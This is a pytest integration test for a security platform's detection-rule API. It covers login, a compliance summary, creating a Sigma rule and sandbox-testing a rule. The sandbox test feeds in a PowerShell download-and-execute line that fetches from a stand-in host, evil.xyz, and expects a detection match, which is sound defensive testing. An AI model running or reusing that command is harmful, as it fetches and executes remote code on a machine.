"""
tests/integration/test_phase38_detection_rule_flow.py
=====================================================
Phase 38 Autonomous Detection Rules & Sandbox Flow Integration Tests.
"""

import os
import pytest
from fastapi.testclient import TestClient
from backend.app.main import app


@pytest.fixture
def client():
    return TestClient(app)


@pytest.fixture
def auth_headers(client):
    password = os.getenv("SENTINEL_ADMIN_PASSWORD", "TestAdminPassword2026!")
    res = client.post("/api/v1/auth/login", data={"username": "admin", "password": password})
    assert res.status_code == 200, f"Login failed: {res.text}"
    token = res.json()["access_token"]
    return {"Authorization": f"Bearer {token}"}


class TestDetectionRuleFlow:
    """Integration tests for listing rules, creating candidate rules, and running sandbox tests."""

    def test_detection_rules_and_sandbox_flow(self, client, auth_headers):
        """Test summary, rule creation, and live sandbox evaluation."""
        # 1. Summary
        sum_resp = client.get("/api/v1/compliance-detection/summary", headers=auth_headers)
        assert sum_resp.status_code == 200
        assert "overall_compliance_score" in sum_resp.json()

        # 2. List Rules
        rules_resp = client.get("/api/v1/compliance-detection/detection-rules", headers=auth_headers)
        assert rules_resp.status_code == 200
        rules = rules_resp.json()
        assert len(rules) >= 1
        target_rule_id = rules[0]["id"]

        # 3. Create Rule
        create_resp = client.post(
            "/api/v1/compliance-detection/detection-rules",
            json={
                "rule_name": "Detect S3 PutBucketAcl Violation",
                "rule_type": "SIGMA_YAML",
                "mitre_technique_id": "T1530",
                "rule_syntax_payload": "title: PutBucketAcl\ncondition: selection"
            },
            headers=auth_headers
        )
        assert create_resp.status_code == 200
        assert create_resp.json()["rule_name"] == "Detect S3 PutBucketAcl Violation"

        # 4. Test Sandbox
        sandbox_resp = client.post(
            "/api/v1/compliance-detection/detection-rules/test-sandbox",
            json={
                "rule_id": target_rule_id,
                "test_payload": "Event: powershell.exe IEX DownloadString('http://evil.xyz')"
            },
            headers=auth_headers
        )
        assert sandbox_resp.status_code == 200
        assert sandbox_resp.json()["match_status"] == "MATCH_DETECTED"
